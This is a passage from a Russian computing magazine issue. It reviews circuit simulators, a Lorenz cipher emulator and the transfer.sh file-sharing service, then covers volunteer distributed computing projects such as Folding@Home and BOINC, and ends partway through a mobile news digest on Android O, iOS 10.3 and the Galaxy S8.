      ПОМОГУТ ТЕБЕ С РАЗРАБОТКОЙ ЭЛЕКТРОННЫХ СХЕМ1   Если тебя временами тянет изу чать электронику, то, помимо учеб ‐
        ников и готовых конструкторов, тебе в этом деле немало помогут
        программы‐симуляторы. В них ты сможешь собрать схему и пос‐
         мотреть, как через нее пойдет ток и как изменятся его харак терис‐
         тики, когда он будет проходить через разные компоненты.
          Если ты предпочита ешь веб‐сервис, а не программу, то я тебе
        рекомендую  заглянуть  на  ресурс  EasyEDA.  Это  бесплатный
        кросс‐платформенный набор инструментов, которые не тре буют
         установки и работают прямо в браузере. Здесь есть мощные средс‐
         тва редактирования электрических схем, моделирования цифроана‐
        логовых цепей и разработки печатных плат, для инженеров‐элек‐
        трон щиков, преподавателей, сту дентов и радиолюбителей.





                                EasyEDA

       Даже регистрироваться необя зательно — впрочем, это сложно наз‐
         вать обременитель ной процедурой. С помощью EasyEDA ты можешь
        собирать различные схемы, смотреть, как они работают, и постигать
        азы электроники. К сервису прилагается неплохой учебник. На рус‐
        ский язык он, увы, не переведен, но разобраться в функциях при‐
       ложения при желании можно и по видео.
           Как вариант, можешь глянуть на Circuit Simulator. Это Java‐апплет,
        который симулирует работу электронных схем.





                                          Circuit Simulator

        Здесь есть встроенный осциллограф, которым можно снимать фор‐
        му сигнала в любой точке схемы. А еще есть большая база при‐
       меров схем, которые можно загрузить и пот рогать, — причем
         как простые схемы усилителей, так и весьма сложные схемы дель‐
        та‐сигм АЦП.
          Чтобы ничего не ска чивать, можешь просто зайти по этой ссылке
        и прямо в браузере посмотреть, как работают схе мы. Обозначения
        очень простые: зеленым цветом показы вает ся положительное нап‐
        ряжение, красным — отрицательное, серым обозначается зазем‐
         ление, а движущиеся жел тые точ ки показы вают, как и куда течет ток
        в данной цепи.
          Если навести курсор мыши на элемент, то в правом нижнем углу
        отобразится подробная информация о его состоянии. Чтобы отре‐
        дактировать компонент, нажми на него правой кнопкой мыши
        и выбери соот ветствующий пункт меню.
         Симуляторы позволят тебе испытывать схемы до того, как ты зай‐
       мешься их сборкой в реаль ности, помогут во всем разобраться
        и понять, как работает тот или иной компонент и как себя поведет
        схема с разными по характеристикам компонентами.


       VIRTUAL LORENZ — ОНЛАЙНОВЫЙ СИМУЛЯТОР
      НЕМЕЦКОЙ ШИФРОВАЛЬНОЙ МАШИНЫ ВРЕМЕН ВТОРОЙ
     МИРОВОЙ2
       Ты наверняка слы шал про машину «Энигма» и про то, как английские
        криптографы из Блет чли‐парка под руководством Алана Тьюринга
        взломали ее шифр. Одна ко «Энигма» — не единственная шиф‐
        ровальная машина фашист ской Германии. Агре гат под названием
        «Лоренц» (Lorenz SZ), в отличие от нее, не был портативен и тре‐
        бовал присутствия двух операторов. Сайт Virtual Lorenz поможет
        тебе перенестись назад во времени и попробовать себя в их деле.





       Первое, что нужно сделать, зайдя на сайт, — выключить звук. Аутен‐
        тичный шум машины — это безусловная заслуга разработчиков,
        однако в тишине разбираться с кнопками и рубильниками будет
        гораздо комфортнее.
          Теперь можешь  осмотреться. Сверху  ты  увидишь  картинку
        с изображением части машины и датчики с подрагивающими стрел‐
        ками — это всё декорации. Чуть правее — поле для текста, который
        будет шифроваться. Ты можешь заменить его своим или печатать
        сообщение на клавиатуре — реальной или виртуальной (она рас‐
        положена левее и ниже). Рядом с кла виату рой — замок, ключ
         от которого должен был быть только у старшего офицера (ты же
       можешь открывать и закрывать крышку в свое удовольствие);
       ниже — рубильник, для включения и выключения машины.
         Самое интересное расположено внизу: слева — поля для отоб ‐
        ражения текста, справа — большое поле с цифрами, в котором выс‐
         тавляются начальные значения. Поскольку «Лоренц» использует
      шифр Вернама (то есть одноразовые блок ноты с клю чами шиф‐
        рования, которые передаются из рук в руки), оператор первым
       делом дол жен был выставить нужные значения из блокнота и лишь
        потом что‐то передавать или принимать.
          Вот простой пример работы. Выставь любые цифры, нажми Set
        Wheels (задать значение шестеренок), а затем напечатай, скажем,
        HELLO. В поле Send/Recv появит ся шифрованный текст. Теперь
        сбрось содержимое полей Local и Send/Recv и снова напиши
        HELLO. Шифрованный текст будет другим, поскольку шестеренки
        уже сместились с начальной позиции. Снова нажми Set Wheels: ты
        вернешь колеса машины в позицию, которая соответствует стар‐
        товому коду, и теперь шифрован ный текст выйдет таким же, как и
        в первый раз.





                                   Lorenz SZ42

       Несмотря на применение одноразовых кодов, шифр «Лоренца» уда‐
        лось взломать. Британская разведка перехватила два сообщения,
        которые были переданы с одинаковым ключом, но между переда‐
        чами немцы исправили пару слов. Эта ошибка позволила британ‐
        скому криптографу Уильяму Тату воспроизвести алгоритм машины
        и впоследствии подбирать ключи и расшифровывать сообщения.
        Кстати, эмулятор Virtual Lorenz разработан к сто летию со дня рож‐
        дения Тата.
         Подробнее об истории криптографии читай в статье «Погружение
        в крипту: как работа ют самые известные шифры в исто рии».


      TRANSFER.SH — УДОБНЫЙ ШЕЙРИНГ ФАЙЛОВ ДЛЯ
      ФАНАТОВ КОМАНДНОЙ СТРОКИ3   Из удобных средств поделиться файлом шейрин говые сервисы нын‐
        че превратились в «файлопомойки» — места, заваленные пират ‐
        ским контентом, владельцы которых идут на любые самые низкие
        уловки, только чтобы выжать из посетителя копеечку. Тем отраднее
         видеть, что кто‐то отва жил ся сделать чистый, простой и удобный
        сервис для пересылки файлов.





        Загрузить что‐нибудь на сер вер можно, просто открыв transfer.sh
        и перетянув файл на окно браузера. Если это не картинка, то ты
        получишь две ссылки — на zip и на tar.gz. Картинки же отправляются
        в виде ссы лок на страницы с пред просмотром (нет, выцарапать
        ссыл ку для вставки изображения на свой сайт не выйдет).





       Но главное, для чего предназначен transfer.sh, — это загрузка фай‐
        лов из командной строки. Если у тебя Linux или macOS, то устанав‐
         ливать, скорее всего, ничего не нужно — хватит утилиты  curl,
        которая обычно есть в системе. Ты просто пишешь


        curl ‐‐upload‐file имя‐файла https://transfer.sh/имя‐файла

        и в ответ получаешь ссыл ку типа https://transfer.sh/случайные
        символы/имя‐файла. Ни авториза ция, ни регистрация не нужны
         (вернее, на transfer.sh пока что вообще нет ничего подобного). Если
       же тебя вол нует, что кто‐то может под смот реть твои файлы, то пред‐
         лагается самостоятельно зашифровать их. В конце концов, раз все
        работает из командной строки, собрать шифрование и загрузку
        в один скрипт будет несложно.
         Данные хранятся 14 дней, но при этом ограниче ние по размеру
        очень демократичное — разрешено загружать до 10 Гбайт за раз.
        Как разработчики планируют защищаться от претензий правооб‐
        ладате лей, контент которых наверняка будут шейрить, не сообщает‐
          ся. Монетизация в виде пожертвований биткойнами тоже не тянет
        на пер спективную стратегию — в случае большого наплыва народа
        этого вряд ли хватит.
           Так что не будем загадывать, но ска жем авторам спасибо
        за хорошую вещь, пока она существует. Кста ти, если пуб личный сер‐
        вер тебя не устраивает, ты можешь скачать исходники и захостить
        сервис у себя.
СЦЕНА

ВЫЧИСЛЕНИЯ
НА ДОМУ

КАК ЗАСТАВИТЬ КОМПЬЮТЕР РЕШАТЬ
МИРОВЫЕ ПРОБЛЕМЫ





   Андрей Васильков
    angstroem@hotbox.ru





Владельцам сов ременных компьютеров и мобильных гад‐
жетов  дос тупны мощ нейшие  вычислитель ные  ресурсы,
которые используются на полную катушку только изредка.
При этом сущес твует масса интересных задач, решением
которых мож но заг рузить простаивающую технику. Объеди‐
нившись, тысячи персоналок, ноутбуков и даже смартфонов
могут выс тупать наравне с суперкомпь ютерами.


GRID ВМЕСТО СУПЕРКОМПЬЮТЕРА
Идея объединить девайсы из разных угол ков пла неты в большой кластер
не нова, но реально достижимой она ста ла только с развитием скоростного
интернета. Один в поле не воин, а мировая паутина легко позволя ет соб рать
цифровое войско. Те, кто встал на темную сторону, создают для своих черных
дел ботнеты. Они досят сайты, брутфорсят пароли, рассылают спам и зас‐
тавляют чужие устройства майнить для них криптовалюту. Те, кто остался
на светлой стороне, используют распределенные вычисления для доброго
и вечного — развивают исследовательские проекты, двигают науку и улуч‐
шают жизнь в целом, как это и подоба ет настоящим хакерам.
  Организация  распределенных  вычислений —  трудоемкое  занятие,
которое требует специфических знаний. В зарубежной литературе их обычно
называют словом grid или гетерогенными вычислениями. Первый термин при‐
жился потому, что каждый компьютер образует узел сети (grid), а второй —
поскольку все узлы разные по своей архитектуре и набору установленного
софта. Основная сложность заключается именно в том, чтобы заставить этот
зоопарк работать как единое целое.


НАУКА НАЧИНАЕТСЯ ТАМ, ГДЕ ПОЯВЛЯЕТСЯ МАТЕМАТИКА
В свое время мне доводилось обрабатывать тонны статистических дан ных,
выполнять квантово‐химические расчеты и работать с исследователями,
увлеченными самыми разными областями. Ины ми словами, у меня есть
некоторое представление о роли вычислений в науке и о том, как дела обсто‐
ят в реальности.
  По образованию я врач, поэтому начну с близкой мне темы. В современ‐
ных медицинских исследова ниях диагности ка и лечение множества заболе‐
ваний связаны с изучением структуры белков и их взаимодействия на молеку ‐
лярном уровне. Фол динг полипептидных цепочек, докинг лигандов, генети‐
ческие и биохимические расчеты — все это требует колоссальных вычис‐
лительных ресурсов, которые научному коллективу негде взять. Они либо сто‐
ят запредельно дорого, либо теоретически есть, но на практике к ним не под‐
ступиться. Такая ситуация сложилась не только в России.
   Лет восемь назад вице‐президент компании CDI Джейсон Фарке (Jason
Farqué) проникся этой проб лемой сполна. Тогда выяснилось, что его отец
страдает от хореи Гентингтона — неизлечимого наследственного заболе‐
вания. Проявляется оно обычно на второй половине жизненно го пути, и что
с ним делать — никто не знает. Исследования вяло идут аж с конца XIX века,
но даже механизмы развития болезни толком не были известны, когда отцу
Джейсона поставили этот страшный диагноз.
  Фарке начал читать о заболевании всю доступную литературу. В клиничес‐
кой практике описывалась только под держивающая терапия и симптомати‐
ческое лечение, но он быстро нашел перспективные исследования. Обработ‐
ка  их  данных выпол нялась  в проекте Folding@Home — первой  сети
для биомедицинских распределенных вычислений на добровольной основе.
Суть проекта проста: любой пользователь может установить бесплатное при‐
ложение (первая версия была скринсейвером), и, когда компьютер не занят
другими тяжелыми задача ми, он будет выполнять расчеты белковых молекул
в поисках новых лекарств и методов лечения.
  Посмотрев статистику проекта, Фарке понял, что большая часть доб‐
ровольцев не вносит замет ного вклада. Когда‐то они присоединились,
но теперь не выпол няют даже одного задания в месяц. Мертвые души,
с которыми разработка новых методов лечения так и останется призрачной
надеждой, если не убедить людей заняться проблемой всерьез.
   Лучше всего мотивирует личный пример, поэтому Фарке собрал мощный
кластер (или, как сейчас бы сказали, ферму) из 17 топовых на тот момент
видеокарт  Nvidia  GeForce  GTX  295  и  процессоров  AMD  Phenom
X4 9550 с общей потребля емой мощностью под 7 киловатт. В дальнейшем он
добавил в стойку еще пять видеокарт — можешь посмотреть на эту конструк ‐
цию на видео.
   Его ферма получила название Atlas Folder, быстро вырвалась в топ и пос‐
лужила хорошим мотиватором. Добровольцы сот нями в день подключали
свои игровые компьютеры и приставки PlayStation 3, а суммарная произво‐
дительность Folding@Home перева лила за 19 «чистых» петафлопс. В последу‐
ющие годы и в свои лучшие дни она превыша ла 100 петафлопс — это боль‐
ше, чем у Sunway TaihuLight — самого мощного в мире суперкомпьютера.





               Atlas Folder — фрагмент кластера из 23 видеокарт


Присоединить ся  к Folding@Home проще простого. Достаточно  открыть
в Google Chrome эту стра нич ку, и браузер автоматически загрузит и нач нет
выполнять расчет очередного бел ка. Ты можешь ввести свои данные
или выполнять расчеты анонимно. В при мере ниже моделирует ся докинг про ‐
теинкиназы С (PKC) с различными лигандами. Глав ным образом — с бел‐
ковыми рецепторами клеточной мем браны. Механизм это го взаимодействия
важен для разработки новых лекарственных препаратов от болезни Альцгей‐
мера.





              Биохимические расчеты прямо в браузере

Если тебе неудобно запускать расчеты в браузере, то на главной странице
проекта есть ссыл ка на классическое десктопное приложение. На большинс‐
тво вопросов поможет найти ответы стра ница FAQ.
  Результаты Folding@Home уже помогли запол нить многие про белы в изу ‐
чении наследственных заболеваний.  Установлены определенные белки,
вызывающие развитие патологии, кодирующие их гены и непосредственно
дефектные кодоны; выяснены молекулярные механизмы патоге неза. Однако
это только начало. Чем глубже мы хотим разобрать ся в какой‐то проблеме,
тем больше ресурсов пот ребуется для этого на каждом последующем этапе.


ТЕМ ВРЕМЕНЕМ НА СЕРВЕРЕ
На стороне клиента научные расчеты выглядят очень просто, а на сервере —
чертовски сложно. Чтобы создать очередное биохимическое задание, уче‐
ным надо выбрать подходящий белок (или другую молекулу) и формализовать
его с точностью до электрона. Сначала по этим данным будет рассчитана
приблизительная модель, выпол нены проверки, а затем лучшие кандидаты
отправятся на компьютеры волонтеров.
   Клиентское приложение автоматически загрузит задания и будет вычис‐
лять уже точные углы и межатомные расстояния в круп ной молекуле. Отдель‐
ные задания моделируют взаимодействие двух и более молекул, а также учи‐
тывают влияние растворителя и вносят другие поправки.
  После того как несколько компьютеров выпол нят одно и то же задание,
сервер сравнит результаты и примет решение: считать его правильным
или требующим повторной проверки. Такой подход позволяет выполнять
надежные вычис ления в постоянно меняющейся сети, узлы которой нельзя
считать доверенными.
  Для построения 3D‐модели полипептидных цепочек обычно используется
термодинамическая гипотеза фол динга белков, выдвинутая Кристианом
Бемером Анфинсеном. За нее он в 1972 году получил Нобелевскую премию
по химии. По точной трехмерной структуре белка и других органических
молекул можно  рассчитать  положение  их  активных  центров  и  всех
функциональных групп. Эта информация позволяет довольно точно оценить
реакционную  способность,  биологическую  активность,  потенциальные
области применения и уровень токсичности соединения, еще не имея
на  руках  самого  вещества.  Благодаря  кван тово‐химическим  методам
на порядки ускоряется разработка лекарств и диагностических маркеров.


В ДАЛЕКОЙ-ДАЛЕКОЙ ГАЛАКТИКЕ
Моделирование белковых структур — важная, но далеко не единственная
задача, которую можно решать с помощью распределенных вычислений.
Вопреки закону Мура, в научных коллективах постоянно нарастает нехватка
ИТ‐ресурсов. Во всем мире их львиная доля задействована в индустрии раз‐
влечений и в обработке коммерческих данных.
  Острая фаза эксперимента может длиться секунды, а вот анализ иногда
растягивается на месяцы, если не годы. К суперкомпьютерам выстраиваются
очереди ученых, либо же необходимые гигабайты с гигафлопсами собира‐
ются по крохам среди волонтеров. Приведу несколько цифр для лучшего
понимания масштабов.
  Эксперименты на Большом адронном коллайдере генерируют с полсотни
петабайт данных ежегодно. Для их хранения и обработки построена отдель‐
ная  сеть WLCG  (Worldwide  LHC  Computing  Grid),  которая  объеди‐
няет 170 вычислительных центров в 42 странах (включая Россию), но даже
с ней расчеты растягиваются на многие месяцы.
  Каждый год автоматические обсерватории получают больше данных, чем
удавалось собрать за всю историю астрономии вплоть до начала XXI века. Я
сказал «каждый год»? Простите, вспомнил доклад пятилетней давности. Тут
мне подсказывают — уже каждые два‐три месяца, а скоро будет каждую
неделю. Постоянно совершенствуются инструменты и растут объ емы наб‐
людений.
  Например, только первый телескоп из системы Pan‐STARRS, установ‐
ленный на вершине вул кана Мауна‐Кеа, оснащен камерой с разрешени‐
ем 1,4 гигапикселя (массив из 60 CCD‐мат риц). По снимкам с нее был создан
цифровой обзор неба размером в 2 петабайта. Этот общедоступный ресурс
стал настоящим Клондайком для астрономов со всего мира.





                       Телескоп Pan‐STARRS 1


TheSkyNet POGS — похожий проект, который был запущен Международ ным
центром радиоастрономии в Перте. В его рамках компьютеры энту зиастов
обработали 50 тысяч изображений галактики M100, сня тых тремя телес‐
копами в разных диапа зонах. Современ ные астрономы редко смот рят
в телескопы сами. Они поручают анализ астрофотографий компьюте ру,
и сами тоже работают с сухими цифрами. Обы вателю же всегда хочется
романтики и наглядности. Поэтому один из участников проекта составил кар‐
ту, объединив большую часть кадров (45 тысяч). Каждая точка на этой па‐
нораме с разрешением 11,5 гигапикселя — изоб ражение целой галак тики.
В этом легко убедиться, увеличивая картинку (осторожно, большой трафик).
  Снимки подобраны так, что различными цветами выделены области фор‐
мирования новых звезд (белые и свет ло‐желтые), участки рукавов спираль‐
ной галактики без активного образования звезд (фиолетовый) и зоны скоп‐
ления звезд главной последовательности (красный). Если темпы вычислений
сохранятся, то из мил лионов снимков уже к следующему году получится соз‐
дать совершенно уникальный мультиспектральный атлас звездного неба.


ПРИЗЕМЛЕННЫЕ ИНТЕРЕСЫ
Существует множество других научных проектов, которые активно развива‐
ются за счет добровольных вычислений. Большинство из них направлено
на фундаментальные  исследова ния  или  астрономические  наб людения,
которые традиционно финансируются по остаточному принципу. Однако
при желании можно уви деть практическую ценность в любом из них.
  К примеру, в Asteroids@Home рассчитывают объемные модели асте ‐
роидов по результатам фотометрии. Казалось бы — ну отрисовали они
холодные каменюки в вакууме, опубликовали пару статей — нам‐то что с это‐
го? Проблема в том, что эти глыбы временами пролетают слишком близко
к Земле или вовсе падают с неба.
  Считается, что вероятность пострадать от падения астероида ничтожно
мала. Ее даже приводят в пример как исчезающе малую величину на лек циях
по теории вероятностей. Одна ко чем больше мы изу чаем асте роиды, тем
сильнее приходится повышать эту веро ятность.





  Аризонский кратер

Астероиды изменяют орбиту из‐за соударений, эффекта Ярковского и гра‐
витационных влияний других небесных тел. К примеру, астероид 99942 Апо‐
фис диаметром около 325 мет ров сблизит ся с Землей в 2029 году, из‐за чего
изменит свою орбиту и подойдет к нашей планете еще ближе на следующем
витке в 2036 году. Пока вероятность его падения на Землю оценивается
как невысокая, но она будет расти в ближайшей перспек тиве.
   Только крупных ударных кратеров на Земле обнаруже но более двухсот.
Например, озеро Каракуль в Таджикис тане образовалось на месте падения
астероида около пяти мил лионов лет назад. Площадь озера — 380 квад‐
ратных километров. Представляешь, какой силы был удар?
   Пять миллионов лет назад — это очень дав но, однако другой ударный кра‐
тер — Жаманшин — появил ся в Казахста не всего 10 тысяч лет назад.
Об этом, по мнению доктора геолого‐минера логических наук Э. П. Изоха,
свидетельствуют результаты анализа обнаруженных тектитов. По расчетам,
этот кратер диаметром 7 километров и глубиной более 500 метров обра‐
зовался при падении астероида размером 300 ± 100 метров в поперечнике.
Его размеры примерно такие же, как у легендарного Апофиса, вдохновив‐
шего создателей постапока липтических игр.





   Распределение известных и математически предсказанных астероидов


Среди астероидов есть очень крупные и множество таких, чьи параметры
определены лишь приблизительно. К примеру, астероид 272 Антония был
открыт 14 февраля 1888 года французским астрономом Огюстом Шарлуа.
Параметры этого астероида оставались неопределенными долгое время.
Только в 2015 году их удалось уточ нить по данным фотомет рического ана‐
лиза. Необходимые расчеты выполнили два участника проекта распределен‐
ных вычислений Asteroids@Home, а точнее — их компьютеры во время прос‐
тоя. С начала проекта ноут буки и десктопы тысяч волонтеров со всего мира
вычислили уточненные размеры, фор му и парамет ры орбиты более чем
для 400 других астероидов.
   Антония летает себе в глав ном поясе и никого не трогает, но к настояще‐
му времени уже обнаружены более 6000 потенциально опасных (сбли‐
жающихся с Землей) астероидов. Многие из них открыты совсем недавно.
Они разделены на группы с поэтическими названиями: Амуры, Атоны, Апол‐
лоны и Атиры. Вот только в момент импакта даже оказавшимся за несколько
километров от места столкновения будет не до лирики.





Красные и желтые точки — астероиды, пред став ляющие опасность для Земли


Пока большая часть Земли оставалась неосвоен ной, астероидные импакты
случались в безлюдных и малонаселенных регионах. Сегодня таких мест
остается все меньше, и вопрос уже заключается не в том, «упадет ли на нас
с неба камень», а где и когда это произойдет.
  Существующие программы исследова ния ближнего космоса неспособ ны
дать точный ответ на этот вопрос. Впервые падение астероида было пред ‐
сказано в 2008 году. Опасное сближение астероида 2008 TC3 обнаружили
за сутки, но место его падения вычислили лишь очень примерно. Из‐за
малого диаметра (до 5 метров) он почти полностью сгорел в атмосфере
над территорией Судана, однако все рав но не исчез бесследно. Атмосфер‐
ный взрыв оценивал ся в одну‐две килотонны.
  По современной классификации астероидами называют космические тела
диаметром от 30 метров — такие уже не сгорают в атмосфере дот ла, а успе‐
вают вызвать значительные разрушения на поверхности Земли.
  Изменить траекторию астероидов или разрушить их до сближения с Зем‐
лей в реальности пока невозможно — не хватит Брюсов Уиллисов, да и под‐
ходящих ракет нет. Одна ко мы можем внести свой вклад в решение общей
проблемы, просто позволив компьютерам выпол нять астрономические рас‐
четы во время простоя. За один час видеокарта среднего класса выполняет
одно  задание  Asteroids@Home  (если  ты  в  это  время  не  режешься
в Overwatch).


УНИВЕРСАЛЬНАЯ ПЛАТФОРМА BOINC
Успех Folding@Home оказал ся заразительным, и многие исследователи
захотели повторить его в своих проектах. Сегодня есть готовые платформы,
позволяющие относительно просто развернуть свою сеть доб ровольных
вычислений или в пару кликов присоединиться к существующей. Пожалуй,
самой известной из них стала BOINC (Berkeley Open Infrastructure for Network
Computing). Она написана на C++ и распространяется под лицензией LGPL.
  Идея BOINC — та же, что и у Folding@Home: часть свободных вычис‐
лительных ресурсов можно тратить на решение актуальных научных задач.
Благодаря BOINC были успешно запущены сотни проектов в области матема‐
тики, физики, астрономии, биохимии и медицины. Для своей числогрызки я
отбираю те проекты, которые уже дают значимые результаты. Желательно —
доступные бесплатно для исследователей всего мира.





     Одновременная работа двух проектов и четырех задач в BOINC


Платформа BOINC существует с 10 апреля 2002 года. Ее современные вер‐
сии доступны для Windows, Mac, Linux и Android. В рубрике PC Zone в этом
номере ты найдешь статью про BOINC, где мы рассказываем об особен‐
ностях настройки, выборе проекта и прочих технических тонкостях.


ПОТРЕБНОСТИ ГНОСТИЧЕСКИЕ И АЛЬТРУИСТИЧЕСКИЕ
Почти все открытые проекты распределенных вычислений выполняются
на добровольной основе и не предполагают вознаграждения участников.
Однако постоян но предпринима ются попыт ки простимулировать волонтеров.
Например,  прикрутить  к  платформе  для  распределенных  вычислений
какую‐нибудь стороннюю систему поощрений, добавить в них игровой эле‐
мент или начислять криптовалюту пропорционально объемам вычислений.
Мы разберем эту тему подробнее в одной из следующих статей.
   Чаще всего в том случае, если расчеты на твоем компьютере привели
к какому‐то открытию, твой аккаунт отметят на странич ке про екта и пришлют
письмо с поздравлениями. Также тебя будут упоминать в различных чартах,
отмечая очередные достижения по объему и скорости вычислений.
  Еще один популярный способ привлечь внимание — это разные конкурсы.
Например, ком пания EVGA устраивает Giveaway day и разыгрывает одну
из топовых видеокарт среди кранчеров BOINC. Серверы сбо ра статистики
порой устраивают состязания по наб ранным очкам и (опционально) вручают
призы от спон соров.
  Сейчас в BOINC участвует почти 4,5 мил лиона добровольцев. Один компь‐
ютер в этом море незаметен, поэтому кранчеры объединяются в команды.
Для команд придуманы отдельные соревнования. К примеру, вот такие —
по правилам чем пионата «Формулы‐1».





        Командный зачет в распределен ных вычислениях на плат‐
       форме BOINC

Лично меня куда больше радуют практические результаты исследований,
быстрее выполнить которые помогли мои компьютеры. Например, в начале
года была опубликована статья об откры тии еще 13 молодых гамма‐пуль‐
саров. Эти редкие ней тронные звез ды найдены волонтерами проекта рас‐
пределенных вычислений Einstein@Home в ходе обра ботки данных, получен‐
ных от космического гамма‐телескопа Ферми.
  Ранее в другом проекте (GPUGrid) волонтеры помогли в моделировании
поведения мутировавших белков, нарушающих экспрессию генов и внут‐
риклеточные связи. Конеч но, это не открытие «лекарства от рака», но важный
момент в понимании развития злокачественных новообразований. Статья
была опубликована в Nature. Каждый год в авторитетных изданиях публику ‐
ются десятки не менее ценных статей по расчетам кран черов. Авто ры иссле‐
дований  всегда  упоминают  соответствующие  проекты  распределенных
вычислений и подчеркивают, что без помощи волонтеров их работа была бы
невозможна.
X‐MOBILE

    МОБИЛЬНЫЙ
     ДАЙДЖЕСТ
  МАРТА
     ANDROID O, IOS 10.3, GALAXY S8,
       БЕЗОПАСНОСТЬ ANDROID





                                         Евгений Зобнин
                                                     zobnin@glc.ru





Сегодня  в  выпус ке:  Android O и  его противоречивый
механизм энергосбережения, iOS 10.3 и функция поиска
наушников, LineageOS и режим управления одной рукой.
А также: софтверные особенности Galaxy S8, боль шой отчет
Google о безопасности Android и его экосистемы, раз бор
новой версии тро яна Android/Ztorg, приложения, скрытно
устанавливающие другие приложе ния, и обзор новых статей
и библиотек для разработчиков.


ANDROID O
Наверное, главная новость марта — это релиз превью‐версии Android O,
которая, скорее всего, будет иметь индекс 8.0 и, по слухам, называться Oreo.
Новый Android отнюдь не стал откровением и больше похож на инкремен‐
тальный релиз с реализацией новых функций.
  Одно из главных и в то же время противоречивых новшеств Android O —
это расширение механизмов сохранения энер гии: теперь блокируются неяв‐
ные широковещательные интенты  (они используются, например,  чтобы
открывать ссыл ки с помощью приложений‐клиентов), лимитируется частота
запроса информации о местоположении и ограничивается работа фоновых
служб.
  Все эти огра ничения накладываются на работающие в фоне приложе ния
и, в принципе, достаточно логич ны, но уже вызвали недовольство разработ‐
чиков. Дело в том, что запрет на исполнение фоновых служб фактически
хоронит одну из лучших черт Android — воз можность беспрепятственной
работы фоновых приложений в противовес применя емой в iOS и Windows
Mobile  ограниченной  системы фоновых обработчиков  (аналог  которой
появился еще в Android 5.0). К счастью, новая система энергосбереже ния
не будет применяться  к уже существующим приложениям, собранным
без поддержки Android O.
  Еще одно новшество — каналы уведомлений. Теперь приложения могут
разбить уведомления на различные категории (каналы), а пользователь
может выборочно управлять ими и блокировать каждый из них по отдельнос‐
ти. Простейший пример: блокирование новостей о политике в новостном
приложении.





                  Управление каналами уведомлений

В Android O наконец‐то появил ся API Autoﬁll, позволяющий разработчикам
приложений писать менеджеры паролей с поддержкой автозаполнения. Да,
они умели делать это и раньше, но только с помощью API Accessibility,
который сильно грузит систему и работает далеко не со всеми приложе‐
ниями.
   Picture in Picture — новый многооконный режим, позволяющий выводить
окна приложений поверх видеороликов без оста новки воспро изведения.
Кроме того, Android теперь поддерживает конфигурацию multi‐display, когда
экран устройства и подключенный к нему внешний монитор система воспри‐
нимает как одно целое, позволяя перемещать окна между экранами.
   Иконки приложений  теперь  могут подстра иваться под оформление
интерфейса различных производителей. В прошив ках, использующих квад‐
ратные иконки с закруглением (Samsung TouchWiz), система будет автомати‐
чески делать иконку квадратной, в системах с круглыми иконками (Google
Pixel) — круглой. Сейчас производители реализуют то же самое с помощью
собственных прослоек и хаков, Android O позволя ет унифицировать процесс.
Достигается это благодаря двухслойным иконкам, верхний слой которых
остается неизменным, а нижний меняется в зависимости от используемой
прошивки. Этот же механизм позволя ет реализовать различные эффекты.





        Как может выглядеть иконка в разных вариантах интерфейса


Из других новшеств:
 • поддержка новых API, появившихся в Java 8;
 • оптимизация ART, позволившая поднять скорость про хождения некоторых
   тестов в несколько раз;
 • поддержка кодеков для высококачественной передачи звука по Bluetooth
   (LDAC);
 • поддержка технологии Wi‐Fi Aware, позволяющая двум устройствам под‐
   ключаться друг к другу напрямую без использования точки доступа;
 • API ConnectionService, позволя ющий интегрировать программы дозвона
   в систему, не нарушая ее концепции интерфейса;
 • AAudio API для профессиональных приложений обработки звука, тре‐
  бующих минималь ной задержки при работе со звуком;
 • кардинальная перера ботка окна настроек, теперь все настройки разбиты
   на несколько глобальных разделов;
 • возможность сдвинуть кнопки навига ции влево или вправо для более
   удобного управления одной рукой;
 • кнопки быстрого запуска, располагающиеся в нижних краях экрана бло ‐
   кировки, теперь можно заменить ярлы ками любых приложений;
 • для доступа к опциям для разработчиков (и, как следствие, возможности
   активировать ADB) теперь необ ходимо ввести пароль от экрана блокиров‐
   ки;
 • при запуске приложений, использующих перекрытие окон (в том числе
   различных бан ковских троянов), в строке состояния теперь появляется
   несмахиваемое уведомление.


IOS 10.3
Обновилась и iOS, но изменений в ней совсем немного. В основном баг‐
фиксы и мелкие улучшения, но есть и действительно большое новшество:
файловая система APFS.
  APFS была представлена на WWDC 2016 как замена устаревшей HFS+.
Она ориентирована исключительно на твердотельные накопители и может
одинаково эффективно работать на любых устройствах, начиная от Apple
Watch и заканчивая Mac Pro. APFS имеет функцию дедупликации (например,
копия файла не будет занимать дополнительное пространство на диске
до тех пор, пока она не будет изменена), поддерживает снапшоты (файловую
систему можно «сфотографировать и откатить обратно» в любое время),
шифрование данных и контрольные суммы для проверки целостности данных.
На сегодняшний момент APFS менее производительна, чем HFS+, что можно
объяснить ее молодостью.
   Второе заметное нов шество — это функция поиска AirPods в приложении
«Найти iPhone». Совсем недавно в App Store появилось аналогичное сторон‐
нее приложение, которое Apple вскоре выпилила, и теперь мы знаем зачем.
Карты сейчас могут показывать погоду в выбранном месте, а у подкастов есть
виджет.
  Многие пользователи отмечают и замет ное ускорение iOS, но, как выяс‐
нилось, дело тут вовсе не в оптимизациях, а в изменившихся таймингах ани‐
мации (она просто стала более быстрой).





                               Find my AirPods


LINEAGEOS
LineageOS (CyanogenMod) также продолжает развиваться. Никаких новых
релизов, только пла номерное улуч шение LineageOS 14.1.
   Главное нововведение — oneHand Mode, режим управления одной рукой.
Реализован примерно так же, как в MIUI: если провести пальцем по экранным
кнопкам навигации влево или впра во, картинка на экране уменьшается
и сдвигается в левую нижнюю или правую нижнюю часть экрана. Для тех, кто
не использует экранные кла виши, есть возможность повесить это действие
на одну из хардварных кнопок (например, долгое удержание или двойное
нажатие).
  В 14.1 наконец‐то вернулись дополнительные тайлы для панели быстрых
настроек (шторки). Сейчас доступны:
 • Caffeine — блокировка отклю чения экрана;
 • USB Thether — раздача интернета по USB;
 • Sync — включение/отключение синхронизации данных;
 • Battery Saver — включение режима энергосбережения;
 • Ambient Display — режим Ambient, включающий экран при поступлении
   уведомления;
 • Heads Up — включение/отключение показа уведомлений в верхней части
   экрана;
 • Volume Panel — доступ к панели управления громкостью;
 • ADB over Network — отладка по сети.

Напомним, что начиная с 7.0 сторонние приложения также могут добавлять
собственные тайлы в быстрые настройки.





                          OneHand Mode


SAMSUNG GALAXY S8
В конце февраля Samsung предста вила Galaxy S8, свой новый флагман,
который должен восстановить репутацию компании после истории с воспла‐
меняющимся Note 7. Об этом написали уже на каждом углу, поэто му мы
не будем повторяться, а вместо этого остановимся на интересных програм‐
мных технологиях, вошедших в его прошивку.





                       Samsung Galaxy S8

Первое, о чем стоит ска зать, — это ассистент Bixby, сво еобразный ответ
